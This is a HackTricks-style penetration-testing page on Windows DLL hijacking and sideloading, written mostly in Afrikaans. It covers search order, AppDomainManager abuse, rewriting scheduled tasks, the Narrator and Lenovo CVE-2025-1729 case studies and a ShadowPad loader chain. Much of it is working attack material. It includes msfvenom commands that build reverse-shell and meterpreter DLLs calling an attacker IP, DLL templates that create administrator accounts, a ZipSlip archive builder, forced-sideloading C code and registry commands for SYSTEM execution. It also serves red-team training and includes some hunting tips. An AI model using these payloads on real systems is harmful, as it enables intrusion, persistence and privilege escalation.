# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking behels die manipulering van 'n vertroude toepassing om 'n kwaadwillige DLL te laai. Hierdie term dek verskeie taktieke soos **DLL Spoofing, Injection, en Side-Loading**. Dit word hoofsaaklik gebruik vir code execution, om persistence te bereik, en, minder gereeld, privilege escalation. Ten spyte van die fokus hier op escalation, bly die metode van hijacking konsekwent oor doelwitte heen.

### Common Techniques

Verskeie metodes word gebruik vir DLL hijacking, elk met sy doeltreffendheid wat afhang van die toepassing se DLL loading-strategie:

1. **DLL Replacement**: Vervang 'n egte DLL met 'n kwaadwillige een, opsioneel met DLL Proxying om die oorspronklike DLL se funksionaliteit te behou.
2. **DLL Search Order Hijacking**: Plaas die kwaadwillige DLL in 'n search path voor die wettige een, en benut die toepassing se search patroon.
3. **Phantom DLL Hijacking**: Skep 'n kwaadwillige DLL vir 'n toepassing om te laai, terwyl dit dink dit is 'n vereiste DLL wat nie bestaan nie.
4. **DLL Redirection**: Wysig search parameters soos `%PATH%` of `.exe.manifest` / `.exe.local` files om die toepassing na die kwaadwillige DLL te lei.
5. **WinSxS DLL Replacement**: Vervang die wettige DLL met 'n kwaadwillige teenhanger in die WinSxS directory, 'n metode wat dikwels met DLL side-loading geassosieer word.
6. **Relative Path DLL Hijacking**: Plaas die kwaadwillige DLL in 'n user-controlled directory saam met die gekopieerde toepassing, soortgelyk aan Binary Proxy Execution tegnieke.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading is nie die enigste manier om 'n vertroude **.NET Framework** proses attacker code te laat laai nie. As die teiken-executable 'n **managed** toepassing is, raadpleeg die CLR ook 'n **application configuration file** wat dieselfde naam as die executable dra (byvoorbeeld `Setup.exe.config`). Daardie lêer kan 'n custom **AppDomainManager** definieer. As die config na 'n attacker-controlled assembly wys wat langs die EXE geplaas is, laai die CLR dit **voor die application's normale code path** en voer dit binne die vertroude proses uit.

Volgens Microsoft se .NET Framework configuration schema moet beide `<appDomainManagerAssembly>` en `<appDomainManagerType>` teenwoordig wees vir die custom manager om gebruik te word.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimale bestuurder:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktiese notas:
- Hierdie is **.NET Framework-specific** tradecraft. Dit hang af van CLR config parsing, nie van die Win32 DLL search order nie.
- Die host moet werklik 'n **managed EXE** wees. Vinnige triage: `sigcheck -m target.exe`, `corflags target.exe`, of kyk vir die **CLR Runtime Header** in PE metadata.
- Die config-lêernaam moet presies ooreenstem met die executable-naam (`<binary>.config`) en leef gewoonlik **langs die EXE**.
- Dit is nuttig met **signed Microsoft/vendor binaries** omdat die trusted EXE onaangeraak bly terwyl die malicious managed assembly in-process execute.
- As jy reeds 'n writable installer/update directory het, kan AppDomainManager hijacking as die **first stage** gebruik word, gevolg deur classic DLL sideloading of reflective loading vir later stages.

### Hijacking an existing scheduled task to relaunch the sideload chain

Vir persistence, kyk nie net vir **creating a new task** nie. Sommige intrusion sets wag totdat 'n legit installer 'n **normal updater task** skep en **rewrite dan die task action** sodat die bestaande naam, author, en trigger vir defenders bekend bly.

Reusable workflow:
1. Installeer/run die legit software en identifiseer die task wat dit normaalweg skep.
2. Export die task XML en let op die huidige `<Exec><Command>` / `<Arguments>` values.
3. Replace net die action sodat die task jou **trusted host EXE** vanaf 'n user-writable staging directory begin, wat dan side-load of AppDomain-load die regte payload.
4. Re-register dieselfde task name in plaas daarvan om 'n nuwe, voor-die-hand-liggende persistence artifact te skep.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Waarom dit stealthier is:
- Die task name kan steeds legitiem lyk (byvoorbeeld ’n vendor updater).
- Die **Task Scheduler service** begin dit, so parent/ancestor validation sien dikwels die verwagte scheduling chain in plaas van `explorer.exe`.
- DFIR teams wat net na **new task names** soek kan ’n task miskyk waarvan die registration reeds bestaan het, maar waarvan die action nou na `%LOCALAPPDATA%`, `%APPDATA%`, of ’n ander attacker-controlled path wys.

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Vergelyk `C:\Windows\System32\Tasks\*` XML en `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata teen ’n baseline.
- Alert wanneer ’n **vendor-looking updater task** uitvoer vanaf **user-writable directories** of ’n .NET EXE met ’n colocated `*.config` file begin.

> [!TIP]
> Vir ’n step-by-step chain wat HTML staging, AES-CTR configs, en .NET implants bo-op DLL sideloading lae, review die workflow hieronder.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Die mees algemene manier om missing Dlls binne ’n stelsel te vind, is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals te laat loop, **en die** **volgende 2 filters** **te stel**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

en wys net die **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

As jy op soek is na **missing dlls in general**, **laat** jy dit vir ’n paar **sekondes** loop.\
As jy op soek is na ’n **missing dll inside an specific executable**, moet jy **nog ’n filter soos "Process Name" "contains" `<exec name>`** stel, dit uitvoer, en **event capture stop**.

## Exploiting Missing Dlls

Om privileges te eskaleer, is die beste kans wat ons het om ’n **dll te skryf wat ’n privilege process sal probeer laai** op een of ander plek **waar dit gaan gesoek word**. Daarom sal ons ’n **dll kan skryf** in ’n **folder** waar die **dll voor** die folder gesoek word waar die **original dll** is (weird case), of ons sal in staat wees om te **skryf na ’n folder waar die dll gaan gesoek word** en die original **dll** bestaan nie in enige folder nie.

### Dll Search Order

**Binne die** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kan jy vind hoe die Dlls spesifiek gelaai word.**

**Windows applications** soek na DLLs deur ’n stel **pre-defined search paths** te volg, volgens ’n spesifieke volgorde. Die probleem van DLL hijacking ontstaan wanneer ’n kwaadwillige DLL strategies in een van hierdie directories geplaas word, wat verseker dat dit voor die outentieke DLL gelaai word. ’n Oplossing om dit te voorkom is om seker te maak die application gebruik absolute paths wanneer daar na die DLLs waarna dit verwys, verwys word.

Jy kan die **DLL search order on 32-bit** stelsels hieronder sien:

1. Die directory van waar die application gelaai is.
2. Die system directory. Gebruik die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function om die path van hierdie directory te kry.(_C:\Windows\System32_)
3. Die 16-bit system directory. Daar is geen function wat die path van hierdie directory verkry nie, maar dit word wel gesoek. (_C:\Windows\System_)
4. Die Windows directory. Gebruik die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function om die path van hierdie directory te kry.
1. (_C:\Windows_)
5. Die current directory.
6. Die directories wat in die PATH environment variable gelys is. Let daarop dat dit nie die per-application path insluit wat deur die **App Paths** registry key gespesifiseer word nie. Die **App Paths** key word nie gebruik wanneer die DLL search path bereken word nie.

Dit is die **default** search order met **SafeDllSearchMode** geaktiveer. Wanneer dit gedeaktiveer is, skuif die current directory na tweede plek. Om hierdie feature te deaktiveer, skep die **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value en stel dit na 0 (default is geaktiveer).

As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function met **LOAD_WITH_ALTERED_SEARCH_PATH** geroep word, begin die search in die directory van die executable module wat **LoadLibraryEx** laai.

Laastens, let daarop dat **’n dll gelaai kan word deur die absolute path aan te dui in plaas van net die name**. In daardie geval gaan daardie dll **slegs in daardie path gesoek word** (as die dll enige dependencies het, gaan hulle gesoek word asof dit net by name gelaai is).

Daar is ander maniere om die search order te verander, maar ek gaan hulle nie hier verduidelik nie.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Gebruik **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) om DLL names te versamel wat die process probeer maar nie kan vind nie.
2. As die binary op ’n **schedule/service** loop, sal die drop van ’n DLL met een van daardie names in die **application directory** (search-order entry #1) by die volgende execution gelaai word. In een .NET scanner case het die process na `hostfxr.dll` in `C:\samples\app\` gesoek voordat dit die regte copy vanaf `C:\Program Files\dotnet\fxr\...` gelaai het.
3. Bou ’n payload DLL (bv. reverse shell) met enige export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. As jou primitive ’n **ZipSlip-style arbitrary write** is, craft ’n ZIP waarvan die entry uit die extraction dir ontsnap sodat die DLL in die app folder land:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Lewer die argief by die gemonitorde inbox/share af; wanneer die geskeduleerde taak die proses weer begin, laai dit die kwaadwillige DLL en voer jou kode uit as die service account.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

’n Gevorderde manier om die DLL-soekpad van ’n nuutgeskepte proses deterministies te beïnvloed, is om die DllPath-veld in RTL_USER_PROCESS_PARAMETERS te stel wanneer die proses met ntdll se native APIs geskep word. Deur ’n gids te verskaf wat deur die aanvaller beheer word, kan ’n teikenproses wat ’n geïmporteerde DLL by naam oplos (geen absolute path en nie die safe loading flags gebruik nie) geforseer word om ’n kwaadwillige DLL uit daardie gids te laai.

Key idea
- Bou die process parameters met RtlCreateProcessParametersEx en verskaf ’n pasgemaakte DllPath wat na jou beheerde vouer wys (bv. die gids waar jou dropper/unpacker leef).
- Skep die proses met RtlCreateUserProcess. Wanneer die teiken-binary ’n DLL by naam oplos, sal die loader hierdie verskafte DllPath tydens resolusie raadpleeg, wat betroubare sideloading moontlik maak selfs wanneer die kwaadwillige DLL nie langs die teiken EXE lê nie.

Notes/limitations
- Dit beïnvloed die child process wat geskep word; dit verskil van SetDllDirectory, wat net die current process beïnvloed.
- Die teiken moet ’n DLL by naam import of LoadLibrary (geen absolute path en nie LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories gebruik nie).
- KnownDLLs en hardcoded absolute paths kan nie hijack word nie. Forwarded exports en SxS kan prioriteit verander.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasionele gebruiksvoorbeeld
- Plaas 'n kwaadwillige xmllite.dll (wat die vereiste functions uitvoer of na die regte een proxy) in jou DllPath directory.
- Start 'n signed binary wat bekend is daarvoor dat dit xmllite.dll by name opsoek deur die bogenoemde technique te gebruik. Die loader resolve die import via die verskafde DllPath en sideload jou DLL.

Hierdie technique is in-the-wild waargeneem om multi-stage sideloading chains aan te dryf: 'n aanvanklike launcher drop 'n helper DLL, wat dan 'n Microsoft-signed, hijackable binary met 'n custom DllPath spawn om te forseer dat die attacker se DLL uit 'n staging directory gelaai word.


#### Exceptions on dll search order from Windows docs

Sekere exceptions op die standaard DLL search order word in Windows documentation genoem:

- Wanneer 'n **DLL wat dieselfde naam deel as een wat reeds in memory gelaai is** teëgekom word, bypass die system die gewone search. In plaas daarvan voer dit 'n check vir redirection en 'n manifest uit voordat dit na die DLL wat reeds in memory is default. **In hierdie scenario doen die system nie 'n search vir die DLL nie**.
- In gevalle waar die DLL as 'n **known DLL** vir die huidige Windows version erken word, sal die system sy version van die known DLL gebruik, saam met enige van sy dependent DLLs, **en die search process laat vaar**. Die registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** hou 'n list van hierdie known DLLs.
- Indien 'n **DLL dependencies het**, word die search vir hierdie dependent DLLs gedoen asof hulle slegs deur hul **module names** aangedui is, ongeag of die aanvanklike DLL deur 'n full path geïdentifiseer is.

### Escalating Privileges

**Requirements**:

- Identifiseer 'n process wat onder **verskillende privileges** werk of sal werk (horizontal or lateral movement), wat **'n DLL ontbreek**.
- Verseker dat **write access** beskikbaar is vir enige **directory** waarin die **DLL** **gesoek** sal word. Hierdie location kan die directory van die executable of 'n directory binne die system path wees.

Ja, die vereistes is ingewikkeld om te vind, want **by default is dit nogal vreemd om 'n privileged executable te vind wat 'n dll ontbreek** en dit is selfs **vreemder om write permissions op 'n system path folder te hê** (jy kan dit nie by default doen nie). Maar in misconfigured environments is dit moontlik.\
As jy gelukkig is en jy vind dat jy aan die vereistes voldoen, kan jy die [UACME](https://github.com/hfiref0x/UACME) project nagaan. Selfs al is die **main goal van die project om UAC te bypass**, kan jy daar 'n **PoC** van 'n Dll hijaking vir die Windows version vind wat jy kan gebruik (waarskynlik net deur die path van die folder waar jy write permissions het, te verander).

Let daarop dat jy jou **permissions in 'n folder kan check** deur:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
En **kontroleer permissions van alle folders binne PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Jy kan ook die imports van ’n uitvoerbare lêer en die exports van ’n dll nagaan met:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Vir 'n volledige gids oor hoe om **Dll Hijacking te abuse om privileges te escalate** met permissions om in 'n **System Path folder** te skryf, kyk:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sal kyk of jy write permissions op enige folder binne system PATH het.\
Ander interessante automated tools om hierdie vulnerability te discover is **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._

### Example

In geval jy 'n exploitable scenario vind, sou een van die belangrikste dinge om dit suksesvol te exploit wees om **'n dll te create wat ten minste al die functions export wat die executable daaruit sal import**. In elk geval, let op dat Dll Hijacking handig is om [van Medium Integrity level na High te escalate **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) of van[ **High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system)**.** Jy kan 'n voorbeeld vind van **hoe om 'n valid dll te create** binne hierdie dll hijacking study wat gefokus is op dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Verder kan jy in die **next sectio**n 'n paar **basic dll codes** vind wat dalk nuttig kan wees as **templates** of om 'n **dll met non required functions exported** te create.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basies is 'n **Dll proxy** 'n Dll wat in staat is om **jou malicious code uit te voer wanneer dit gelaai word** maar ook om as **verwag** te **expose** en te **werk** deur **alle calls na die real library te relay**.

Met die tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik **'n executable aandui en die library selekteer** wat jy wil proxify en **'n proxified dll te generate** of **die Dll aandui** en **'n proxified dll te generate**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kry 'n meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Skep 'n user (x86 ek het nie 'n x64-weergawe gesien nie):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Jou eie

Let daarop dat in verskeie gevalle die Dll wat jy saamstel **verskeie funksies moet uitvoer** wat deur die slagofferproses gelaai gaan word, as hierdie funksies nie bestaan nie sal die **binary nie in staat wees om** hulle te laai nie en die **exploit sal misluk**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL example with user creation</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatiewe C DLL met thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Gevallestudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe ondersoek steeds by opstart ’n voorspelbare, taalspesifieke localization DLL wat gehijack kan word vir arbitrêre kode-uitvoering en persistence.

Kernfeite
- Probe path (huidige builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (ouer builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- As ’n skryfbare, aanvaller-beheerde DLL by die OneCore path bestaan, word dit gelaai en `DllMain(DLL_PROCESS_ATTACH)` loop. Geen exports is nodig nie.

Discovery met Procmon
- Filter: `Process Name is Narrator.exe` en `Operation is Load Image` of `CreateFile`.
- Start Narrator en observeer die poging om die bogenoemde path te laai.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC stilte
- ’n Naïewe hijack sal UI laat praat/uitlig. Om stil te bly, enumereer by attach Narrator threads, open die main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) en `SuspendThread` dit; gaan voort in jou eie thread. Sien PoC vir volledige code.

Trigger en persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Met bogenoemde, laai die begin van Narrator die geplante DLL. Op die secure desktop (logon screen), druk CTRL+WIN+ENTER om Narrator te start; jou DLL execute as SYSTEM op die secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Laat classic RDP security layer toe: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP na die host, druk by die logon screen CTRL+WIN+ENTER om Narrator te launch; jou DLL execute as SYSTEM op die secure desktop.
- Execution stop wanneer die RDP session sluit—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- Jy kan 'n built-in Accessibility Tool (AT) registry entry clone (bv. CursorIndicator), dit wysig om na 'n arbitrary binary/DLL te point, dit importeer, en dan `configuration` stel na daardie AT name. Dit proxy arbitrary execution onder die Accessibility framework.

Notas
- Writing onder `%windir%\System32` en changing HKLM values vereis admin rights.
- Alle payload logic kan in `DLL_PROCESS_ATTACH` leef; geen exports is nodig nie.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Hierdie case demonstreer **Phantom DLL Hijacking** in Lenovo se TrackPoint Quick Menu (`TPQMAssistant.exe`), gevolg as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` geleë by `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` run daagliks om 9:30 AM onder die context van die logged-on user.
- **Directory Permissions**: Writable deur `CREATOR OWNER`, wat local users toelaat om arbitrary files te drop.
- **DLL Search Behavior**: Probeer om `hostfxr.dll` vanaf sy working directory eerste te load en log "NAME NOT FOUND" as dit ontbreek, wat local directory search precedence aandui.

### Exploit Implementation

’n Attacker kan 'n malicious `hostfxr.dll` stub in dieselfde directory plaas, deur die ontbrekende DLL te exploit om code execution te kry onder die user se context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. As 'n standaardgebruiker, drop `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Wag vir die scheduled task om om 9:30 AM onder die huidige gebruiker se konteks te loop.
3. As 'n administrator aangemeld is wanneer die task uitvoer, loop die malicious DLL in die administrator se session met medium integrity.
4. Chain standaard UAC bypass tegnieke om van medium integrity na SYSTEM privileges te elevate.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors pair dikwels MSI-based droppers met DLL side-loading om payloads onder 'n trusted, signed process uit te voer.

Chain overview
- User download MSI. 'n CustomAction loop stilweg tydens die GUI install (bv. LaunchApplication of 'n VBScript action), en reconstrueer die volgende stage uit embedded resources.
- Die dropper skryf 'n legitimate, signed EXE en 'n malicious DLL na dieselfde directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Wanneer die signed EXE begin, laai Windows DLL search order wsc.dll eers uit die working directory, en execute attacker code onder 'n signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Look vir entries wat executables of VBScript run. Example suspicious pattern: LaunchApplication wat 'n embedded file in background execute.
- In Orca (Microsoft Orca.exe), inspect CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in die MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or gebruik lessmsi: lessmsi x package.msi C:\out
- Look vir multiple small fragments wat deur 'n VBScript CustomAction concatenated en decrypted word. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktiese sideloading met wsc_proxy.exe
- Plaas hierdie twee lêers in dieselfde vouer:
- wsc_proxy.exe: wettige ondertekende host (Avast). Die proses probeer om wsc.dll volgens naam vanaf sy gids te laai.
- wsc.dll: aanvaller-DLL. As geen spesifieke exports benodig word nie, kan DllMain voldoende wees; anders, bou ’n proxy DLL en forward vereiste exports na die ware biblioteek terwyl die payload in DllMain loop.
- Bou ’n minimale DLL-payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Vir export requirements, gebruik ’n proxying framework (bv. DLLirant/Spartacus) om ’n forwarding DLL te genereer wat ook jou payload uitvoer.

- Hierdie technique maak staat op DLL name resolution deur die host binary. As die host absolute paths of safe loading flags gebruik (bv. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kan hijack misluk.
- KnownDLLs, SxS, en forwarded exports kan precedence beïnvloed en moet tydens seleksie van die host binary en export set in ag geneem word.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point het beskryf hoe Ink Dragon ShadowPad ontplooi deur ’n **drie-lêer triad** te gebruik om in te smelt by legit software terwyl die kern payload op disk geënkripteer bly:

1. **Signed host EXE** – vendors soos AMD, Realtek, of NVIDIA word misbruik (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die attackers hernoem die executable om soos ’n Windows binary te lyk (byvoorbeeld `conhost.exe`), maar die Authenticode signature bly geldig.
2. **Malicious loader DLL** – langs die EXE neergesit met ’n verwagte naam (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL is gewoonlik ’n MFC binary wat met die ScatterBrain framework obfuscate is; sy enigste taak is om die encrypted blob te vind, dit te decrypt, en ShadowPad reflectively te map.
